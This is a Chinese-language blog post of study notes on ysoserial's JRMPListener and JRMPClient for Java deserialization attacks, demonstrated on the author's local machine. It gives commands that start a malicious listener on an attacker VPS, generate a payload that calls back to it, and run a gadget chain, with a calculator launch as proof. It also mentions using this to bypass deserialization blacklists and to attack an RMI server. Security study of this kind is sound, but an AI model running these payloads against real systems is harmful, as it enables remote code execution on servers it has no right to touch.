---
layout:     post
title:      JRMPListener && JRMPClient使用小记
subtitle:   
date:       2020-04-12
author:     跳跳龙
header-img: img/post-bg-ios9-web.jpg
catalog: true
tags:
    - java安全
            
---

目前很多的反序列化的漏洞在利用的过程中都使用到了JRMPListener，JRMPClient。但实际上，在ysoserial项目中，exploit和payloads这2个单词意义是不同的。以前我一直都不怎么区分这2个概念。payloads偏向于一种静态的概念，可以是生成的二进制负载数据。exploit更偏向于一种主动的攻击程序。下面我用2个本地的简单的demo就能对比一下。2个demo分别是正着打server和反着打。就是反序列化可以来回打，有种“踢你一脚，结果让人家反手一巴掌”的感觉。

### 使用JRMP模拟RMI Client反打。

#### 第一步
在VPS端开启JRMPListener

```
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 7777 CommonsCollecitons1 'open /Applications/Calculator.app/'
```

#### 第二步
在本机生成JRMPClient Payloads

```
java -jar ysoserial.jar JRMPClient 'vps_ip:7777' > jrmpclient.cer
```

![](http://tiaotiaolong2.cn-bj.ufileos.com/blog37-01.jpg)

#### 第三步
在本机电脑上模拟在反序列化的场景，反序列化上一步中生成的payload。

```
FileInputStream fin = new FileInputStream("/Users/tangtianlong/hackingtools/ysoserial/jrmpclient.cer");
        ObjectInputStream obin=new ObjectInputStream(fin);
        obin.readObject();
```

这个时候就会触发本机中的CommonsCollecitons1的调用链。
![](http://tiaotiaolong2.cn-bj.ufileos.com/blog37-02.jpg)
VPS端同时也打印了来自客户机的调用日志。
![](http://tiaotiaolong2.cn-bj.ufileos.com/blog37-03.jpg)

#### 疑问
这里肯定会有种疑问，客户机中明明存在CommonsCollecitons1的调用依赖，为什么还绕了一大圈才触发Gadget。这种在一些特定的场景下是很有奏效的。

比如客户机这里存在一些黑名单的校验，可以采用这种方式进行反序列化绕过。


### 使用JRMP正打，攻击RMI Server端

#### 第一步

这里为了方便，还是使用一个java原生反序列化的操作。服务器的代码如下：

```
FileInputStream fin = new FileInputStream("/Users/tangtianlong/hackingtools/ysoserial/jrmplistener.cer");
        ObjectInputStream obin=new ObjectInputStream(fin);
        obin.readObject();
```

首先生成待反序列化的payloads 目的是为了让服务器开启1099端口，开放一个rmi服务。
(下图中的代码我直接输出出来了，可以写入到jrmplistener.cer文件中)

![](http://tiaotiaolong2.cn-bj.ufileos.com/blog37-04.jpg)


#### 第二步
1099端口发现开启之后，可以使用exploit/JRMPClient直接打。
![](http://tiaotiaolong2.cn-bj.ufileos.com/blog37-05.jpg)

可以弹出日历程序。

其实除了JRMPClient可以攻击server端，还有exploit/RMIRegistryExploit也同样可以攻击rmi server。但是两者的原理是不一样的。 



